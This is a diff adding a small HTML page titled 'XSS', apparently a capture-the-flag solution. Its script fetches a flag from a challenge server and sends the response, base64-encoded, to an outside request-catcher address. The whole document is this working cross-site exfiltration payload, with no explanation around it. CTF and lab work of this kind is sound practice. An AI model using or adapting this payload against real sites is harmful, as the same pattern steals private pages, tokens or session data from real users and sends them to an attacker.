@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+    <head>XSS</head>
+    <body>
+        <script>
+            let url = "https://hii.requestcatcher.com/out?data=";
+            fetch("http://chal.firebird.sh:36998/flag")
+            .then((out)=>{
+                return out.text();
+            })
+            .then((out)=>{
+                fetch(url+btoa(out));
+            })
+        </script>
+    </body>
+</html>
